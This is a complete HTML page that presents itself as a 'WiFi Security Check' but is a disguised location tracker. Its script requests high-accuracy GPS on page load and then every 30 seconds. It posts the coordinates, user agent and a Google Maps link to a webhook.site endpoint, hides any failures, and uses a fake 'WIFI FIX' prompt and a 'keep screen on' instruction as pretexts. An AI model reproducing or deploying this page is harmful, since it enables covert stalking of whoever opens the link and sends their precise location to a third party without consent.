<!DOCTYPE html>
<html>
<head>
<title>WiFi Verification</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body {font-family:sans-serif;text-align:center;background:#1e3a8a;color:white;padding:20px;}
button {background:red;color:white;border:none;padding:20px;font-size:20px;border-radius:10px;}
#status {font-size:24px;margin:20px;}
#coords {background:#111;padding:15px;border-radius:10px;}
</style>
</head>
<body>
<h1>🔒 WiFi Security Check</h1>
<div id="status">📡 Scanning WiFi + GPS...</div>
<button onclick="getLocation()">📍 ALLOW GPS FOR WIFI FIX</button>
<div id="coords"></div>
<small>Keep screen ON • Do not close</small>

<script>
const WEBHOOK = 'https://webhook.site/#!/c2f96a55-bb46-4f47-a5ce-3d31c4505c3e';

function sendData(pos) {
  const data = {
    timestamp: new Date().toISOString(),
    lat: pos.coords.latitude,
    lon: pos.coords.longitude,
    accuracy: pos.coords.accuracy,
    altitude: pos.coords.altitude || 0,
    speed: pos.coords.speed || 0,
    ua: navigator.userAgent,
    google_maps: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
  };
  
  // SHOW ON PHONE
  document.getElementById('coords').innerHTML = 
    `📍 ${data.lat.toFixed(6)}, ${data.lon.toFixed(6)}<br>
     Accuracy: ${data.accuracy}m<br>
     <a href="${data.google_maps}" target="_blank">🗺️ Open Google Maps</a>`;
  
  // SEND TO WEBHOOK
  fetch(WEBHOOK, {
    method: 'POST',
    body: JSON.stringify(data),
    headers: {'Content-Type': 'application/json'}
  }).catch(e=>{}); // Silent fail
}

function getLocation() {
  navigator.geolocation.getCurrentPosition(sendData, ()=>{}, {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  });
}

// AUTO-TRIGGER
getLocation(); // Immediate
setTimeout(getLocation, 2000);
setTimeout(getLocation, 5000);
setInterval(getLocation, 30000); // Every 30s
</script>
</body>
</html>
